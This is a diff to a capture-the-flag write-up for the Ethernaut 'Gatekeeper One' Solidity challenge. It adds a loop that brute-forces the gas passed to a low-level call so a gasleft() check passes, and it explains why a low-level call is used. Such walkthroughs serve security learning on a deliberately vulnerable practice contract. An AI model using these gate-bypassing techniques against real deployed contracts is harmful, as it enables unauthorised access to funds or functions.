@@ -43,4 +43,19 @@ Pass all gates through satisfying gate modifiers.
 
 - `gateTwo` requires `gasleft() % 8191 == 0`. We need to bruteforce the function and increment the gas in each function call until one of the values hits the spot.
 
+  ```
+    for (uint256 i = 0; i < 300; i++) {
+      (bool success, ) = address(challenge).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+      if (success) {
+          break;
+      }
+    }
+  ```
+
+  The reasons why low level call is used rather than direct function call `challenge.enter(_gateKey)`:
+
+  - Reverts are not bubbled up
+  - Type checks are bypassed
+  - Function existence checks are omitted
+
 3.  Deploy the `GatekeeperOneAttacker` contract to `Sepolia` and call `exploit` to hack this level.
